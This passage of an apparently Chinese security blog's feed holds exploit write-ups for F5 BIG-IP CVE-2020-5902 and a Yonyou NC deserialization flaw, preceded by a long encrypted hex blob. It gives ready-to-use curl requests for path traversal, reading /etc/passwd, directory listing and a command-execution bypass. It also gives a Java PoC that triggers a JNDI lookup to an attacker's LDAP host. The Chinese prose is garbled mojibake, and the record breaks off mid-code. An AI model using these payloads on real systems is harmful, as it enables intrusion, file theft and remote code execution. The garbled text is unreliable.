071589d86bb27e93eebe8090a03c64e396a0000955dbf0ff1cd2dd4eef7ba7c3455b283b7f04a077784881e98201cbf600df6a0dd414e478c0bff339f4dc3c65d90184907a64c7581c346d697d15efe025e5fc5665a335f981c97adb89cfee1805c736e0713927a5a874244d41f14d9c9a75d746b114d8bbc91d9a211ce143486c9e7c8fc87e74bea73c6a2a286c6f08485b80cd4df35a1dedf0f66e452bd868e165a9b57eef369d8d36cd291da8a8ffeb5953aabccee59bb6fb9bea7d653b3e5413da4a92e0f67cc679a813046f7f0bb95b239d0b45f5be7838ef5065d83c837322cd854365e95569ccbd29d18897456ae06862f30cc9102103e21f6e954479814372d006067e7f7c81250923d10a9eb3332b30c5b8ce51dd6c9482c2b8568331adf4ac864860c75bace39bbcc95155a5907bcef6e82689799c5f781fd58eea5e43374f50cda997663f0182f6898218eb1118d84008ed387d6eaea8ca300e720658aebb56aaaf4e5c503277b404995ddcf6492a55ac25f0d7c0bb90adab3ccf2d1a5b1dfd9afbf65f626b798be789ef58e6fb5775d47c40a6ce0891a0ff08dcb50c04c922382bb009ed3f26a70edf9fb17ac02a20d0828a372457f09393748289767733076559ee61eccbf996fdf46ed5c48ea7b5e0cefb8bf70839da6abe9329a61cf286adecaaaf2dc4e12014e2895c08d1bb872c2dee42f87178688a960cd98b5901d108fe32f860de4c9ecf4e6f4c241fbf7d2d35370613dd35a97da13177e69f5696632fc03e66c33f26c4bb88ce44c1c061867133f7f45a12a90db4bea1b3130d640ff7166dab920dfcec8159cbb7f5d5ce61bc66a7846087fb47a847e4874acd943d02cef791043e071f7ceab50179fcbe7c73690b267b2cb3632e545c6340d58fffc92ca29bee6350ac5664f4d74a343231033bb84f5c171f365513b040e39d28b4260b630828d9aad7a93f494d6a3e457fa187fa228b9105fec70d24ae381ff5b20f0301c05e2584cef86712ea9637da9f67a0cd8fc734cc8d2bb01577064c82426146b753f8ddadf637afd8a3b4f4762b83ad15cae63c53bae8aad2537c9f4cf42d2b60caeebf03a22516e2cc5591ff56c387bcffbe9ca76d651d2fad3e8938642de70a3158e56555de6fdda27ac846e1d47d86c59741ab5e23d499a6455f41fe28d8c18c7d50a4601f88a1d953572a9881cfe9bee1fbee6b36be736f2f888b94f3de82bc0793d91abe3c1ffe91891a547381ddb6a1abe2b14c4440c50775ae2dc99f9765de9ce12c2663524b6af9388736bf725d238a790b4212edd6773d9e2fb057bbf0f2ef4f5bc91c35117546def642068793f8862626f20148f55285fb87245234fcefef668329db6a28b258452f346e86f51f039f0ddca1e8344d018a0fd1abb57deadd56695d997fe12c39b25a0c0441952c2d71bcf0b687e978642cbb0186f6feb403c5b96e44dd8084f319c29b40a8a4a74e6ca8986e4ed5836056515dd1298c1c550e32f3ac3a325ed4f80f009a99600361c5a7c354f422d1e65bb245f3939d14ac12ee57757edb6a62174394b3c55a5c87b0a02510e1cb518405f8106cb154c85a8fc5399ff1321e494c097f58cbf7f5d28721384e2f97cd4d83bfa416ae7a329858adeedb77baf78e829cf653ecc3087548c090544ac001f0ab5d2f02871a4272279b730fc454abf22993f73aa78a2d740b658a0cc9c31c6a7377eeff23f72eba55376d6476231f4bf1202b836118371801fcc55fbceeaa814da999cb04bd4397da821df6049c1164e930f147da7fdafa3a875af8d203fee9230710bbe9fb94ecfabdbfc26cc98a4964559ca0a0cbf338ddf5806a78c97beb8aa26a4093b274f4dd5d25a7c089593e2d34cded2fdd83a6aac69228027d5afc4e625acc01c35596054b1ca6f14359b923e16a3971288db3a2de9709f3a5bbc07ce2c7aed958d05a493fcfce4bf7aa6d7e31018f51b1de70654413b31184ec3dfd329335d7eddb101b75e622828af97664987bde2f60b186539a935648c8eccb52a96a778419626177dfb3df46649a9e18e8f36b21414ebde85a5e47d84d60bfd6f09b45d295d6f0216a7406d45e90daf4fa123255b3f4b42151b07eda8ee963823c0bffc142bd4931dfbd807e1bec11e93887f4ef79912b539b4b1b1a6482082e8d8e183e02dad328eaf5897ef514e374a9703a23f862546b2b01ad6494dfb24ed25d0eea7ee7cf537481781fca148052b68399f52965383e6e259ef065914fef386adc24045e2678c3649f38c82590d3fa387b9d828119cf70973665cf024bcc511b9c2030ec9d59a179f0b7b115d7bc5adb8105127bfd9651fdcc79f18f6b011a7f553b0e5197710f60a87d32c0d0bf309483b1ca6415d0414b78628b867599ef24436d635464d977da36c117a487bea8e86efd3a4f57e19525f5b4584a21b209f92ed9137e48fe752c7b9235e3e9ec5e0ad02ee39bfc82b13b7895f4b6050741b894a0f578c50965f4f142214d8315c7c13622a835ed3fdac9cef738fd24d20633bf1ba79e72bbc7e2d32d3265a103ac4dedced5f07f69d926f3be4dd78d56d6c5af17851255ed002167de69ce4b47beb6db18e9fd73e3c3781b1fe7c89f89418b344b4c1cbbf704e21a967b414263d28a7e31393626b441a80a5eedb6343d7347666b88f92f29fc841d4b3fbbd408ea6f9ea80488b6a23220a40f82d65a3efa885c5e58cfc26157a54259d432695f1bb1aac4b355673de4008948b0ff3ab20e92a2a2e24bfb7f4d6ff44f9db74f753a3e68fab2a8183d7b40a13ff42a0a47af51113ee8630a35a081747e10bd4a29d23ab125895013655c2f2b49860ab6ba234fed483a4bbb3d33e23ce89f72cf63e9ca8d687e70571d9585e73a8748a4e8d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
    
      <category term="Pentest" scheme="https://blog.sari3l.com/categories/Pentest/"/>
    
    
      <category term="Êô∫ËÉΩÂêàÁ∫¶" scheme="https://blog.sari3l.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>F5 BIG-IP RCEÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/58a67794/"/>
    <id>https://blog.sari3l.com/posts/58a67794/</id>
    <published>2020-07-06T02:45:39.000Z</published>
    <updated>2020-07-08T07:00:40.315Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>‰ªéÈÄöÂëä‰∏≠ÂèØ‰ª•ÊòéÁ°ÆÂá†‰∏™ÁÇπ</p><ol><li>‰Ωç‰∫é tmui</li><li><code>..;</code>Ë∑ØÂæÑÁ©øÈÄè -&gt; Apache Tomcat</li><li>ÈöêËóèÈ°µÈù¢</li></ol><p>ËôöÊãüÊú∫‰∏≠ÊèêÂèñÊ∫êÁ†ÅÂπ∂ÁÆÄÂçïÂàÜÊûêÂêéÂèØ‰ª•Á°ÆÂÆöjspÂØπÂ∫îclass‰Ωç‰∫é</p><pre class=" language-shell"><code class="language-shell"># Áõ∏ÂØπË∑ØÂæÑ/www/tmui/WEB-INF/classes/org/apache/jsp/tmui# ÁªùÂØπË∑ØÂæÑ/usr/local/www/tmui/WEB-INF/classes/org/apache/jsp/tmui</code></pre><p>ÊúÄÂêéÂú® locallb/workspace ‰∏≠ÂèØ‰ª•ÁúãÂà∞Êúâ‰ª•‰∏ãÂá†‰∏™ÂÖ≥ÈîÆÁ±ª</p><table><thead><tr><th>class</th><th>jsp path</th><th>feature</th><th>parameter</th></tr></thead><tbody><tr><td>create_jsp.class</td><td>/tmui/locallb/workspace/list.jsp</td><td>ÂàõÂª∫ jsp Êñá‰ª∂</td><td></td></tr><tr><td>dbquery_jsp.class</td><td>/tmui/locallb/workspace/dbquery.jsp</td><td>Êü•ËØ¢Êï∞ÊçÆÂ∫ì</td><td>query<br>object<br>column</td></tr><tr><td>directoryList_jsp.class</td><td>/tmui/locallb/workspace/directoryList.jsp</td><td>ÂàóÁõÆÂΩï</td><td>directoryPath</td></tr><tr><td>fileRead_jsp.class</td><td>/tmui/locallb/workspace/fileRead.jsp</td><td>ËØªÊñá‰ª∂</td><td>fileName</td></tr><tr><td>fileSave_jsp.class</td><td>/tmui/locallb/workspace/fileSave.jsp</td><td>ÂÜôÊñá‰ª∂</td><td>fileName<br>content</td></tr><tr><td>import_jsp.class</td><td>/tmui/locallb/workspace/import.jsp</td><td>Âä†ËΩΩ jsp Êñá‰ª∂</td><td></td></tr><tr><td>list_jsp.lass</td><td>/tmui/locallb/workspace/list.jsp</td><td>ÂàóÊï∞ÊçÆÂ∫ì‰ø°ÊÅØ</td><td></td></tr><tr><td>properties_jsp.class</td><td>/tmui/locallb/workspace/properties.jsp</td><td>ÂèÇÊï∞ËÆæÂÆö</td><td>pageType<br>properties</td></tr><tr><td>settings_jsp.class</td><td>/tmui/locallb/workspace/settings.jsp</td><td>Âàó‰∏æÂèÇÊï∞‰ø°ÊÅØ</td><td></td></tr><tr><td>tmshCmd_jsp.class</td><td>/tmui/locallb/workspace/tmshCmd.jsp</td><td>ÂëΩ‰ª§ÊâßË°å</td><td>command</td></tr></tbody></table><p>ÂØπÂ∫î<code>com.f5.tmui.locallb.handler.workspace.WorkspaceUtils</code>‰∏≠ÁöÑÊñπÊ≥ïÂÆûÁé∞</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/58a67794/15940163972331.jpg" alt></p><p>Âú®ÊµèËßàÂô®‰∏≠Áõ¥Êé•ËÆøÈóÆÂä†ËΩΩËøô‰∫õÈ°µÈù¢‰ºöË¢´ÈáçÂÆöÂêëÔºå‰ΩÜÈÄöËøá tomcat Ë∑ØÂæÑÁ©øÈÄèÂèØ‰ª•ÊéßÂà∂Âú® tmui ‰∏ãËøõË°åÂä†ËΩΩ</p><p>ÁÑ∂ÂêéËøôÈáåËØ¥‰∏ã tmshCmd ÊâßË°åÁöÑÈóÆÈ¢ò</p><p>Âú®<code>com.f5.tmui.locallb.handler.workspace.WorkspaceUtils#runTmshCommand</code>‰∏≠ÊâßË°å‰º†ÂÖ•ÁöÑ commandÔºå‰ΩÜÈôêÂà∂ÂèØÁî®ÁöÑÊìç‰Ωú‰∏∫<code>create</code>„ÄÅ<code>delete</code>„ÄÅ<code>list</code>„ÄÅ<code>modify</code>ÂõõÁßçÊ®°ÂùóÔºå‰∏îÁî±‰∫é<code>checkForBadShellCharacters</code>ËøõË°å‰∫ÜËøáÊª§ÔºåÈúÄË¶ÅÊâæÂà∞ÊñπÊ≥ïË∑≥Âá∫ÈôêÂà∂ÈÄöËøá<a href="https://clouddocs.f5.com/cli/tmsh-reference/v13/commands/run.html" target="_blank" rel="noopener"><code>run</code>Ê®°Âùó</a>ÊâßË°å bash ÂëΩ‰ª§</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> JSONObject <span class="token function">runTmshCommand</span><span class="token punctuation">(</span>String command<span class="token punctuation">)</span> <span class="token punctuation">{</span>    F5Logger logger <span class="token operator">=</span> <span class="token punctuation">(</span>F5Logger<span class="token punctuation">)</span>F5Logger<span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span>WorkspaceUtils<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    JSONObject resultObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    String output <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    String error <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    String operation <span class="token operator">=</span> command<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ShellCommandValidator<span class="token punctuation">.</span><span class="token function">checkForBadShellCharacters</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"create"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"delete"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"list"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>operation<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"modify"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        error <span class="token operator">=</span> NLSEngine<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ilx.workspace.error.RejectedTmshCommand"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            String<span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>command<span class="token punctuation">}</span><span class="token punctuation">;</span>            Result result <span class="token operator">=</span> Syscall<span class="token punctuation">.</span><span class="token function">callElevated</span><span class="token punctuation">(</span>Syscall<span class="token punctuation">.</span>TMSH<span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>            output <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getOutput</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            error <span class="token operator">=</span> result<span class="token punctuation">.</span><span class="token function">getError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">CallException</span> var8<span class="token punctuation">)</span> <span class="token punctuation">{</span>            logger<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>NLSEngine<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"ilx.workspace.error.TmshCommandFailed"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">": "</span> <span class="token operator">+</span> var8<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            error <span class="token operator">=</span> var8<span class="token punctuation">.</span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    resultObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"output"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span><span class="token punctuation">;</span>    resultObject<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"error"</span><span class="token punctuation">,</span> error<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> resultObject<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ËøáÊª§ÂáΩÊï∞<code>com.f5.form.ShellCommandValidator#checkForBadShellCharacters</code></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkForBadShellCharacters</span><span class="token punctuation">(</span>String value<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> cArray <span class="token operator">=</span> value<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> cArray<span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">char</span> c <span class="token operator">=</span> cArray<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token string">'&amp;'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">';'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'`'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\''</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\\'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'"'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'|'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'*'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'?'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'~'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'&lt;'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'>'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'^'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'('</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">')'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'['</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">']'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'{'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'}'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'$'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\n'</span> <span class="token operator">||</span> c <span class="token operator">==</span> <span class="token string">'\r'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p>RCEÔºö <a href="https://clouddocs.f5.com/cli/tmsh-reference/v13/commands/" target="_blank" rel="noopener">TMSH ÂëΩ‰ª§ÂèÇËÄÉ</a></p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin'</code></pre><p>P.S. ÂÆûÈôÖËøôÈáåÁöÑ RCE Âú®Ê≤°ÁªïËøáÈôêÂà∂‰πãÂâçÂè™ÊòØÂØπ‰∫é F5 ÊâßË°åÈÉ®ÂàÜÊìç‰ΩúÔºõÂè¶Â§ñËØ¥<code>list auth user admin</code>ËøîÂõûÁªìÊûú‰∏∫Á©∫ÔºåÈÇ£ÊòØÂõ†‰∏∫ admin Â§Ñ‰∫éÊú™ÁôªÂΩïÁä∂ÊÄÅ„ÄÇ</p><p>LFR:</p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd'</code></pre><p>DIRÔºö</p><pre class=" language-shell"><code class="language-shell">curl -k 'https://[HOST]/tmui/login.jsp/..;/tmui/locallb/workspace/directoryList.jsp?directoryPath=/usr/local/'</code></pre><p>‚Ä¶</p><h2 id="RCE-ÈôêÂà∂ÁªïËøá"><a href="#RCE-ÈôêÂà∂ÁªïËøá" class="headerlink" title="RCE ÈôêÂà∂ÁªïËøá"></a>RCE ÈôêÂà∂ÁªïËøá</h2><h3 id="ÂéüÁêÜ"><a href="#ÂéüÁêÜ" class="headerlink" title="ÂéüÁêÜ"></a>ÂéüÁêÜ</h3><p>Êù•Ëá™‰∏çÁü•Ê∫êÂàÜ‰∫´</p><ol><li><p>‰øÆÊîπaliasÂä´ÊåÅlistÂëΩ‰ª§‰∏∫bash</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash</code></pre></li><li><p>ÂÜôÂÖ•bashÊñá‰ª∂</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/xxx&amp;content=id</code></pre></li><li><p>ÊâßË°åbashÊñá‰ª∂</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/xxx</code></pre></li><li><p>ËøòÂéülistÂëΩ‰ª§</p><pre class=" language-http"><code class="language-http">/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list</code></pre></li></ol><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><p><a href="https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/pull/13807/commits/0417e88ff24bf05b8874c953bd91600f10186ba4</a></p><h2 id="‰øÆË°•¬∑ÂèçÂ∫èÂàóÂåñÁªïËøá"><a href="#‰øÆË°•¬∑ÂèçÂ∫èÂàóÂåñÁªïËøá" class="headerlink" title="..;‰øÆË°•¬∑ÂèçÂ∫èÂàóÂåñÁªïËøá"></a><code>..;</code>‰øÆË°•¬∑ÂèçÂ∫èÂàóÂåñÁªïËøá</h2><p>ÂéüÁêÜÔºö<a href="https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/" target="_blank" rel="noopener">https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/</a><br>POCÔºö<a href="https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/" target="_blank" rel="noopener">https://github.com/Critical-Start/Team-Ares/blob/master/CVE-2020-5902/</a></p><h2 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h2><ol><li><a href="https://nosec.org/home/detail/4501.html" target="_blank" rel="noopener">„ÄêÂÆâÂÖ®ÈÄöÊä•„ÄëF5 BIG-IP ËøúÁ®ã‰ª£Á†ÅÊâßË°åÊºèÊ¥û</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;code&gt;..;&lt;/code&gt; ? :)&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="F5" scheme="https://blog.sari3l.com/tags/F5/"/>
    
      <category term="CVE-2020-5902" scheme="https://blog.sari3l.com/tags/CVE-2020-5902/"/>
    
  </entry>
  
  <entry>
    <title>Áî®ÂèãNCÂèçÂ∫èÂàóÂåñ ÁÆÄÂçïÂàÜÊûê</title>
    <link href="https://blog.sari3l.com/posts/608d18f0/"/>
    <id>https://blog.sari3l.com/posts/608d18f0/</id>
    <published>2020-06-17T05:21:18.000Z</published>
    <updated>2020-07-06T09:45:04.075Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Áî±‰∫é‰º†Êí≠„ÄÅÂà©Áî®Ê≠§ÊñáÊâÄÊèê‰æõÁöÑ‰ø°ÊÅØËÄåÈÄ†ÊàêÁöÑ‰ªª‰ΩïÁõ¥Êé•ÊàñËÄÖÈó¥Êé•ÁöÑÂêéÊûúÂèäÊçüÂ§±ÔºåÂùáÁî±‰ΩøÁî®ËÄÖÊú¨‰∫∫Ë¥üË¥£ÔºåÊñáÁ´†‰ΩúËÄÖ‰∏ç‰∏∫Ê≠§ÊâøÊãÖ‰ªª‰ΩïË¥£‰ªª„ÄÇ</p></blockquote><h2 id="ÂáÜÂ§á"><a href="#ÂáÜÂ§á" class="headerlink" title="ÂáÜÂ§á"></a>ÂáÜÂ§á</h2><h3 id="jwdp"><a href="#jwdp" class="headerlink" title="jwdp"></a>jwdp</h3><p>UClient Êèê‰æõ‰∫Ü JVM ÂèÇÊï∞ËÆæÁΩÆÔºåÂú®ÈáåÈù¢Áõ¥Êé•Ê∑ªÂä†</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923660011340.jpg" alt="-w919"></p><p>ÊàñËÄÖÂú®ÂÖ∂ÁõÆÂΩï‰∏ãÁöÑ client.sec ‰∏≠Áõ¥Êé•‰øÆÊîπ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923662221799.jpg" alt="-w1021"></p><h3 id="ÁõÆÊ†á"><a href="#ÁõÆÊ†á" class="headerlink" title="ÁõÆÊ†á"></a>ÁõÆÊ†á</h3><p>Ê≥®ÔºöÊú¨ÊñáÂè™ÊµãËØï‰∫Ü6.5ÁâàÊú¨</p><p>fofaÔºö<a href="https://fofa.so/result?qbase64=dGl0bGU9IllPTllPVSBOQyI%3D" target="_blank" rel="noopener">title=‚ÄùYONYOU NC‚Äù</a></p><h2 id="ÂàÜÊûê"><a href="#ÂàÜÊûê" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h2><p>ÈÄöËøáÂ∑≤ÊúâÁöÑËµÑÊñôÔºåÂú®nc.login.ui.LoginAssistant‰∏≠Êúâ‰ª•‰∏ã‰∏§ÁÇπË∞ÉÁî®lookup</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923664561365.jpg" alt="-w1009"></p><p>ÊúÄÁªàÁî±nc.bs.framework.rmi.RmiNCLocator#lookupÔºåÊ≥®ÊÑèÂà∞ÊòØ remoteContextÔºåÊâÄ‰ª•ËøôÈáåÊòØÁ±ª‰ºº RMI Âà©Áî®‰∏≠ÁöÑ <strong>Client ÈÄöËøáÂêë RMI Registry Áî≥ËØ∑ lookup Êìç‰ΩúËøõË°åÂ∫èÂàóÂåñÊîªÂáª</strong></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923665837519.jpg" alt="-w692"></p><p>ÂêéÈù¢Â∞±ËøõÂÖ•Âà∞Â∏∏ËßÑÊìç‰Ωú‰∫ÜÔºåÊúÄÂêéÊîæ‰∏ãË∞ÉÁî®Ê†à</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923679776836.jpg" alt="-w553"></p><p>Ê≥®ÊÑèÔºåÂà©Áî®Êó∂ÂÄôÈ¶ñÂÖàÁ°ÆÂÆöÊúçÂä°Âô® jdk ÁâàÊú¨Êù•Á°ÆÂÆö payloadÔºåÂèØ‰ª•Áõ¥Êé•ÂÖàÊâìÂêë ceye Êàñ dnslog.cnÔºåÂú®UA‰∏≠‰ºöÊ†áÊòéÁâàÊú¨</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/608d18f0/15923716683106.jpg" alt="-w1453"></p><h2 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h2><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> nc<span class="token punctuation">.</span>bs<span class="token punctuation">.</span>framework<span class="token punctuation">.</span>common<span class="token punctuation">.</span>NCLocator<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Properties<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">poc</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">attack</span><span class="token punctuation">(</span>String url<span class="token punctuation">,</span> String jndipath<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Properties env <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>url<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            url <span class="token operator">=</span> <span class="token string">"http://"</span> <span class="token operator">+</span> url<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        env<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"SERVICEDISPATCH_URL"</span><span class="token punctuation">,</span> url <span class="token operator">+</span> <span class="token string">"/ServiceDispatcherServlet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        NCLocator locator <span class="token operator">=</span> NCLocator<span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span><span class="token punctuation">;</span>        locator<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>jndipath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">attack</span><span class="token punctuation">(</span><span class="token string">"http://target"</span><span class="token punctuation">,</span> <span class="token string">"ldap://ip:port/classname"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token 